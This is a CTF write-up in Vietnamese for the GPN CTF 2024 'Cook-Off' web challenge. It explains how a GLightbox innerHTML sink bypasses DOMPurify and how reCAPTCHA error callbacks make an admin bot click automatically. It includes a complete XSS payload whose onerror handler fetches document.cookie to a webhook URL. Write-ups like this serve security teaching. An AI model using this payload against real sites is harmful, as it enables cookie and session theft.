# GPN CTF 2024 - Cook-Off Writeup (Chi tiết)

## 1. Phân tích bài toán
Ứng dụng web cho phép người dùng nhập văn bản qua tham số `shareText` trên URL. Khi tải trang, văn bản này được đưa qua bộ lọc **DOMPurify** nhằm làm sạch các mã độc XSS và chèn vào DOM dưới dạng HTML.

Có một bot admin chạy ngầm. Khi chúng ta gửi URL đến bot, bot sẽ truy cập URL đó bằng một trình duyệt Chromium không đầu (headless), thiết lập một cookie chứa flag, đợi 10 giây và thoát ra.

## 2. Tìm kiếm lỗ hổng (Vulnerabilities)
Qua việc phân tích mã nguồn và các thư viện bên thứ ba được sử dụng:
1. **DOMPurify & data-* Attributes**:
   - DOMPurify mặc định lọc bỏ các thẻ độc hại (`<script>`, `<iframe>`, ...) và các thuộc tính bắt sự kiện (`onload`, `onerror`, `onclick`, ...). Tuy nhiên, nó cho phép sử dụng hầu hết các thuộc tính tùy chỉnh bắt đầu bằng `data-`.
2. **GLightbox InnerHTML Sink**:
   - Thư viện GLightbox (được sử dụng để hiển thị ảnh/slide phóng to) đọc thuộc tính `data-description` của phần tử được kích hoạt và ghi thẳng thuộc tính đó vào thuộc tính `.innerHTML` của khung hiển thị mô tả mà không thực hiện bất kỳ hình thức làm sạch hay lọc bỏ nào.
   - Nếu ta truyền vào một chuỗi HTML mã hóa thực thể (HTML-encoded) bên trong thuộc tính `data-description` (ví dụ: `data-description="&lt;img src=x onerror=...&gt;"`), DOMPurify chỉ coi đó là một chuỗi thông thường và cho phép lưu trữ. Nhưng khi GLightbox lấy nội dung này và ghi vào `.innerHTML`, trình duyệt sẽ tự động giải mã HTML entities và thực thi payload Javascript chứa trong thuộc tính `onerror` của thẻ `<img>`.

## 3. Rào cản và giải pháp (Bypass & Automation)
Lỗ hổng XSS nằm ở GLightbox, nhưng để kích hoạt XSS thì:
1. GLightbox cần được khởi tạo để theo dõi và đăng ký sự kiện click cho các phần tử HTML mới được chèn vào.
2. Cần có hành vi click từ phía người dùng (hoặc bot) lên một phần tử có cấu hình GLightbox để mở slide.

Vì chúng ta không có quyền thực thi Javascript ngay lập tức (chưa kích hoạt được XSS trước khi click), chúng ta cần tìm cách gọi hàm Javascript sẵn có trên trang bằng HTML thuần.

### Giải pháp sử dụng Google reCAPTCHA v2
Trong `index.html` của bài toán có nạp thư viện Google reCAPTCHA:
```html
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
```
Thư viện này tự động quét qua DOM để tìm các thẻ có class `g-recaptcha` nhằm hiển thị widget xác thực. Hơn nữa, nó hỗ trợ thuộc tính cấu hình `data-error-callback`.
Khi reCAPTCHA gặp lỗi xác thực (ví dụ như sitekey không hợp lệ), nó sẽ tìm hàm toàn cục (global function) tương ứng với tên được khai báo trong thuộc tính `data-error-callback` và thực thi hàm đó.

Chúng ta tận dụng tính năng này để:
1. **Khởi tạo lại GLightbox**: Dùng một widget reCAPTCHA gọi tới hàm `GLightbox`.
2. **Tự động click**: Dùng một widget reCAPTCHA gọi tới hàm `random`. Hàm `random` được định nghĩa sẵn trên trang mục tiêu để giả lập việc nhấp chọn ngẫu nhiên các lựa chọn.

### Giải quyết vấn đề bất đồng bộ (Race Condition)
Các yêu cầu kiểm tra và tải reCAPTCHA diễn ra bất đồng bộ qua mạng. Nếu hàm `random()` được gọi trước khi hàm `GLightbox()` hoàn thành đăng ký sự kiện click, hành vi nhấp chuột sẽ bị bỏ qua và không có XSS nào xảy ra.

Để đảm bảo hàm `GLightbox()` luôn được thực thi trước `random()`, chúng ta khai báo chuỗi các phần tử reCAPTCHA tuần tự trong DOM:
- **10 phần tử reCAPTCHA đầu tiên** cấu hình gọi `GLightbox` khi lỗi.
- **10 phần tử reCAPTCHA tiếp theo** cấu hình gọi `random` khi lỗi.
Vì reCAPTCHA duyệt DOM và gửi yêu cầu xác thực lần lượt từ trên xuống dưới, việc gọi hàm `GLightbox` sẽ được lên lịch thực thi trước.

Bên cạnh đó, để tăng xác suất hàm `random()` nhấp trúng phần tử chứa payload XSS của chúng ta, chúng ta tạo ra nhiều phần tử input (ví dụ: 50 phần tử) có class `glightbox` và chứa payload XSS trong `data-description`.

## 4. Payload XSS hoàn chỉnh
```html
<!-- Thẻ div trung gian lưu webhook URL để exfiltrate dữ liệu -->
<div id="w" data-url="https://webhook.site/9dac072c-d2c9-436e-aa36-ddbef4c3b6ab"></div>

<!-- 10 Recaptcha để khởi tạo GLightbox -->
<div class="g-recaptcha" data-sitekey="i0" data-error-callback="GLightbox"></div>
<div class="g-recaptcha" data-sitekey="i1" data-error-callback="GLightbox"></div>
... (lặp lại) ...

<!-- 10 Recaptcha để kích hoạt nhấp chuột ngẫu nhiên (hàm random) -->
<div class="g-recaptcha" data-sitekey="c0" data-error-callback="random"></div>
<div class="g-recaptcha" data-sitekey="c1" data-error-callback="random"></div>
... (lặp lại) ...

<!-- 50 Input đóng vai trò là slide GLightbox chứa payload lấy cookie gửi về webhook -->
<input name="vote" class="glightbox" data-description="&lt;img src=x onerror=fetch(w.dataset.url+'?c='+document.cookie)&gt;">
... (lặp lại) ...
```

Khi bot admin truy cập liên kết chứa payload này:
1. reCAPTCHA tự động tải và kích hoạt lỗi.
2. `GLightbox()` được gọi để khởi tạo và theo dõi các thẻ `<input class="glightbox">`.
3. Hàm `random()` được gọi tiếp theo để kích hoạt sự kiện click giả lập vào một trong các thẻ `<input>`.
4. Hộp thoại GLightbox mở ra, chèn thẻ `<img src=x onerror=...>` vào DOM.
5. Sự kiện `onerror` kích hoạt, thực thi mã `fetch` để gửi giá trị `document.cookie` về webhook.
6. Chúng ta nhận được flag tại webhook: `GPNCTF{why_Can_recAptcHA_d0_tHaT}`.
